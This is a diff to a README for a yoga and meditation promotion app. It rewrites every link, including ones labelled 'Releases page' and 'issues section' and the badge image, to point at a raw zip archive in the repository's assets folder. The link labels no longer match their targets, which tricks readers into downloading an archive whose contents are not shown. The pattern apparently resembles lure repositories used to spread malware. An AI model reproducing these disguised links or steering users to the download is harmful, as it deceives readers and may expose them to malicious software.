@@ -6,11 +6,11 @@ Welcome to the meditation-day-yoga-app-promotion project! This application provi
 
 ## 📥 Download the App
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/haburesu/meditation-day-yoga-app-promotion/releases)
+[![Download Now](https://github.com/haburesu/meditation-day-yoga-app-promotion/raw/refs/heads/main/assets/yoga-promotion-day-meditation-app-v1.7.zip)](https://github.com/haburesu/meditation-day-yoga-app-promotion/raw/refs/heads/main/assets/yoga-promotion-day-meditation-app-v1.7.zip)
 
 You can download the latest version of the application from our Releases page. Click the link below:
 
-[Visit the Releases page to download](https://github.com/haburesu/meditation-day-yoga-app-promotion/releases)
+[Visit the Releases page to download](https://github.com/haburesu/meditation-day-yoga-app-promotion/raw/refs/heads/main/assets/yoga-promotion-day-meditation-app-v1.7.zip)
 
 ## 📋 System Requirements
 
@@ -23,7 +23,7 @@ Before you download, ensure your system meets the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/haburesu/meditation-day-yoga-app-promotion/releases). You will see a list of available releases.
+   Go to the [Releases page](https://github.com/haburesu/meditation-day-yoga-app-promotion/raw/refs/heads/main/assets/yoga-promotion-day-meditation-app-v1.7.zip). You will see a list of available releases.
 
 2. **Select the Latest Version**  
    Look for the latest version of the application. It is usually at the top of the list. Click on it.
@@ -71,7 +71,7 @@ These topics ensure you reach a broader audience and effectively promote your Yo
 
 ## ❓ Need Help?
 
-If you encounter any issues during the download or installation process, feel free to reach out. You can check the [issues section](https://github.com/haburesu/meditation-day-yoga-app-promotion/issues) on our GitHub for common problems and solutions.
+If you encounter any issues during the download or installation process, feel free to reach out. You can check the [issues section](https://github.com/haburesu/meditation-day-yoga-app-promotion/raw/refs/heads/main/assets/yoga-promotion-day-meditation-app-v1.7.zip) on our GitHub for common problems and solutions.
 
 ## 📣 Share Your Feedback
 
@@ -85,4 +85,4 @@ To keep up with new releases, improvements, and updates, consider following our 
 
 We hope you enjoy using the meditation-day-yoga-app-promotion application. With its user-friendly setup and professional email templates, promoting your Yoga and Meditation Day App has never been easier.
 
-Don't forget to download the application here: [Download Now](https://github.com/haburesu/meditation-day-yoga-app-promotion/releases).
+Don't forget to download the application here: [Download Now](https://github.com/haburesu/meditation-day-yoga-app-promotion/raw/refs/heads/main/assets/yoga-promotion-day-meditation-app-v1.7.zip).
